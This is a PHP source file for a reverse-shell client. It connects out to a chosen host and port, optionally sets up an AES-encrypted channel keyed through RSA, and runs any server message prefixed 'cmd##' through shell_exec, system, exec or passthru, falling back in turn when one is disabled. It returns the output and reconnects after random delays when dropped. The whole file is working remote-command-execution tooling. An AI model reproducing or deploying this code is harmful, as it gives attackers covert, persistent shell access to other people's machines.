<?php namespace App\Client;

require '../encrypt/OpenSsl.php';

use App\Encrypt\OpenSsl;

set_time_limit(0);
ob_implicit_flush(1);

define("BUFFER_LEN", 4096);
define("STREAM_BUFFER_LEN", 1024);

$opts = getopt("h:p:e:", ["host:", "port:", "encrypt:"]);
(count($opts) === 3) || die("Assign host|port|encrypt-flag");

$addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
$port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
$encrypt_flag = array_key_exists("encrypt", $opts) ? intval($opts['encrypt']) : intval($opts['e']);
if($encrypt_flag !== 1){
    $encrypt_flag = 0;
}

if(uses_encryption($encrypt_flag)){
    define('CYPHER', 'AES-256-CBC');
    define('OPTIONS', OPENSSL_RAW_DATA);
    define('HASH_ALGO', 'sha256');
    define('HASH_LEN', 32);
    define('SHA512LEN', 512);
    define('ENC_AES_LEN', 684);
}

$result = ClientSocket::init($addr, $port, $encrypt_flag);

function uses_encryption(int $flag) : bool {
    return $flag === 1;
}

/**
 * todo:: surpress all potential errors
 */

class ClientSocket {
    
    public static function init(string $addr, int $port, int $encrypt_flag){
        ($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) || die("Socket create error");
        ($result = socket_connect($socket, $addr, $port)) || die("Connection to server failed");
        $openssl = new OpenSsl;
        $packet_len = 0;

        echo "[\33[91m!\33[0m] connected.\n";
        
        if(($base64metadata = @socket_read($socket, BUFFER_LEN)) === false){
            echo "error reading inc. metadata, aborting..\n";
            exit(1);
        }

        if(uses_encryption($encrypt_flag)) {
            $_metadata = base64_decode($base64metadata);
            $metadata = [
                'signature' => substr($_metadata, 0, SHA512LEN),
                'encrypted_AES_key' => substr($_metadata, SHA512LEN, ENC_AES_LEN),
                'public_RSA_key_string' => substr($_metadata, SHA512LEN + ENC_AES_LEN),
            ];
            $RSA_pub_stripped = $metadata['public_RSA_key_string'];
            $metadata['public_RSA_key_string'] = "-----BEGIN PUBLIC KEY-----"
                                                .$metadata['public_RSA_key_string']
                                                ."-----END PUBLIC KEY-----";
            array_walk($metadata, function($m) use(&$packet_len) { 
                return $packet_len += mb_strlen($m);
            });
            echo "Packet len: {$packet_len}.\n";
            if(1 !== openssl_verify(
                $metadata['encrypted_AES_key'].$RSA_pub_stripped,
                $metadata['signature'],
                $metadata['public_RSA_key_string'],
                OPENSSL_ALGO_SHA512
            ))
            {
                echo "cannot verify key!\n";
                // exit(1);
            } else {
                if(false === (
                    $AES_key = decryptRSAClient(
                    $metadata['public_RSA_key_string'],
                    $metadata['encrypted_AES_key'])
                ))
                {
                    echo "cannot decrypt key!\n";
                    exit(1);
                }
                unset($metadata);
                unset($_metadata);
                unset($base64metadata);
                unset($RSA_pub_stripped);
                echo "CBC-key: \33[37m{$AES_key}\33[0m\n";
            }
        }

        while(1)
        {
            // restart socket on each dc
            if(($recv = @socket_read($socket, BUFFER_LEN)) === false || $recv === "")
            {
                socket_close($socket);
                echo "[\33[91m!\33[0m] disconnected.\n";
                sleep(rand(1,5));

                $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                //socket_set_option($socket, SOL_SOCKET, SO_REUSEADDR, 1);
                //socket_set_option($socket, SOL_SOCKET, SO_REUSEPORT, 1);
                $result = socket_connect($socket, $addr, $port);
                if($socket && $result){ echo "[\33[91m!\33[0m] connected.\n"; }
            }
            else
            {
                if(isset($AES_key)){
                    $temp_recv = $recv;
                    if(($recv = decrypt_cbcClient($recv, $AES_key)) === null){
                        $recv = $temp_recv;
                    }
                    else {
                        echo "successfuly decrypted msg!\n";
                    }
                }
                if(preg_match('/^(cmd##){1}/', $recv)){

                    $fmt = str_replace('cmd##', '', $recv);
                    $full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim($fmt));
                    $full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";

                    if(function_exists('shell_exec')){
                        $fnc = "shell_exec()";
                        if(($result = @shell_exec($full_cmd)) === null){ $result = "Error"; }
                    }
                    else if(function_exists('system')){
                        $fnc = "system()";
                        @ob_start();
                        if(($result = @system($full_cmd)) === false){ $result = "Error"; }
                        else { $result = @ob_get_contents(); } 		
                        @ob_end_clean(); 
                    }
                    else if(function_exists('exec')){ 
                        $fnc = "exec()";
                        @exec($full_cmd,$results,$ret_status);
                        if($ret_status !== 0){ $result = "Error status: ".$ret_status; }
                        else {
                            $result = "";
                            foreach($results as $res){ $result .= $res."\n\r"; }
                        }
                    }
                    else if(function_exists('passthru')){
                        $fnc = "passthru()";
                        @ob_start();
                        @passthru($full_cmd);
                        $result = @ob_get_contents();
                        @ob_end_clean();
                    }
                    else { $result = "error:: system calls disabled."; }
                    $result .= "exec:: [{$fnc}] --- cmd:: [{$full_cmd}]";
                    if(uses_encryption($encrypt_flag)) {
                        $encrypted_res = encrypt_cbcClient($result, $AES_key);
                    }
                    $r = $encrypted_res ?? $result;
                    if(socket_write($socket, $r, strlen($r)) === false) {
                        continue;
                    }
                }
                else if(preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE)) {
                    break;
                }
                else {
                    echo "server: {$recv}\n";
                }
            }
            $w = $r = $e = [];
            $wbuff = handle_stdin($r, $w, $e);
            if(false === socket_write($socket, $wbuff, strlen($wbuff))){
                echo "\r\nsocket-write error\r\n";
            }
        }
        socket_close($socket);
        unset($openssl);
    }
}
/**
 * 
 * @return string => line
 */
function handle_stdin(array $r, array $w, array $e) : string
{
    $stdin = fopen('php://stdin', 'r');
    stream_set_blocking($stdin, 0);
    $r = [ $stdin ];
    if(($result = stream_select($r, $w, $e, 0.2, 500000)) !== false){
        if($result === 0) { 
            fclose($stdin);
            return "";
        }
        $line = stream_get_line($stdin, STREAM_BUFFER_LEN, "\n");
    }
    else {
        echo "[\33[91m!\33[0m] error: stream_select() error.\n";
        fclose($stdin);
        $line = "";
    }
    fclose($stdin);
    return $line;
}
function decryptRSAClient(string $publicKey, string $encryptedb64) :? string {
    if(false === ($encrypted = base64_decode($encryptedb64))){
        return null;
    }
    if(false === openssl_public_decrypt($encrypted, $decrtypted, $publicKey)){
        return null;
    }
    return $decrtypted;
}
function encrypt_cbcClient(string $clrtext, string $base64key) :? string {
    if(empty($base64key)){ return null; }
    if(false === ($key = base64_decode($base64key))) { return null; }
    try {
        $ivlen = openssl_cipher_iv_length(CYPHER);
        $iv = openssl_random_pseudo_bytes($ivlen);
        $ciphertext = openssl_encrypt($clrtext, CYPHER, $key, OPTIONS, $iv);
        $hmac = hash_hmac(HASH_ALGO, $iv.$ciphertext, $key, true);
        return base64_encode($iv.$hmac.$ciphertext);
    } catch (\Throwable $e){
        return null;
    }
    return null;
}
function decrypt_cbcClient(string $encrypted, string $base64key) :? string {
    if($base64key === null) { return null; }
    if(empty($encrypted)) { return null; }
    if(false === ($encrypted = base64_decode($encrypted))) { return null; }
    if(false === is_binary($encrypted)) { return null; }
    if(false === ($key = base64_decode($base64key))) { return null; }
    try {
        $ivlen = openssl_cipher_iv_length(CYPHER);
        $iv = substr($encrypted, 0, $ivlen);
        $hmac = substr($encrypted, $ivlen, HASH_LEN);
        $ciphertext = substr($encrypted, ($ivlen + HASH_LEN));
        $clrtext = openssl_decrypt($ciphertext, CYPHER, $key, OPTIONS, $iv);
        if($clrtext === false){ return null; }
        $calcmac = hash_hmac(HASH_ALGO, $iv.$ciphertext, $key, true);
        if(hash_equals($hmac, $calcmac)){ return $clrtext; }
        return null;
    } catch (\Throwable $e){
        return null;
    }
    return null;
}
function is_binary(string $s) : bool {
    return ( ! ctype_print($s)) ? true : false;
}


?>